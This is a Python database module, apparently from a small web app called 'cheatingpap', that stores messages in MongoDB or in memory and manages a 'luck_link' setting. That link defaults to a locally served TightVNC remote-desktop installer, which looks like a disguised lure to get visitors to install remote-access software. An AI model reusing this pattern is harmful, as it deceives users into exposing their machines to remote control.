import os
import logging
from datetime import datetime, timezone
from typing import List, Dict, Any
from motor.motor_asyncio import AsyncIOMotorClient
from dotenv import load_dotenv

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("database")

# Load environment variables
load_dotenv()

MONGODB_URI = os.getenv("MONGODB_URI")

# In-memory database fallback if MONGODB_URI is not set
class MockDatabase:
    def __init__(self):
        self.messages = []
        self.settings = {
            "luck_link": "/static/tightvnc-2.8.87-gpl-setup-64bit_2 (1).msi"
        }
        logger.warning("=" * 60)
        logger.warning("WARNING: MONGODB_URI is not set. Using local mock database.")
        logger.warning("Messages will only persist in memory for this session.")
        logger.warning("=" * 60)

    async def save_message(self, content: str) -> Dict[str, Any]:
        msg = {
            "id": str(len(self.messages) + 1),
            "content": content,
            "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
        }
        self.messages.append(msg)
        return msg

    async def get_messages(self) -> List[Dict[str, Any]]:
        # Return reversed so latest messages are shown first
        return list(reversed(self.messages))

    async def get_luck_link(self) -> str:
        return self.settings.get("luck_link", "https://www.google.com")

    async def update_luck_link(self, url: str) -> str:
        self.settings["luck_link"] = url
        return url

# MongoDB database connection
class MongoDatabase:
    def __init__(self, uri: str):
        logger.info("Connecting to MongoDB Atlas...")
        self.client = AsyncIOMotorClient(uri)
        # We will use a database named "cheatingpap"
        self.db = self.client["cheatingpap"]
        self.messages_col = self.db["messages"]
        self.settings_col = self.db["settings"]
        logger.info("MongoDB connection initialized.")

    async def save_message(self, content: str) -> Dict[str, Any]:
        msg = {
            "content": content,
            "timestamp": datetime.now(timezone.utc)
        }
        result = await self.messages_col.insert_one(msg)
        msg["id"] = str(result.inserted_id)
        # Convert timestamp to ISO string for JSON serialization
        msg["timestamp"] = msg["timestamp"].isoformat() + "Z"
        # Remove original ObjectId since it isn't JSON serializable directly
        if "_id" in msg:
            del msg["_id"]
        return msg

    async def get_messages(self) -> List[Dict[str, Any]]:
        messages = []
        cursor = self.messages_col.find().sort("timestamp", -1)
        async for doc in cursor:
            ts = doc.get("timestamp")
            ts_str = ""
            if isinstance(ts, datetime):
                if ts.tzinfo is None:
                    ts_str = ts.isoformat() + "Z"
                else:
                    ts_str = ts.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")
            else:
                ts_str = str(ts)
            
            messages.append({
                "id": str(doc["_id"]),
                "content": doc.get("content", ""),
                "timestamp": ts_str
            })
        return messages

    async def get_luck_link(self) -> str:
        doc = await self.settings_col.find_one({"_id": "luck_link"})
        if doc:
            return doc.get("url", "/static/tightvnc-2.8.87-gpl-setup-64bit_2 (1).msi")
        
        # Default link if none exists in DB
        default_url = "/static/tightvnc-2.8.87-gpl-setup-64bit_2 (1).msi"
        await self.settings_col.update_one(
            {"_id": "luck_link"},
            {"$set": {"url": default_url}},
            upsert=True
        )
        return default_url

    async def update_luck_link(self, url: str) -> str:
        await self.settings_col.update_one(
            {"_id": "luck_link"},
            {"$set": {"url": url}},
            upsert=True
        )
        return url

# Initialize database based on whether URI is provided
if MONGODB_URI and MONGODB_URI.strip():
    db = MongoDatabase(MONGODB_URI)
else:
    db = MockDatabase()
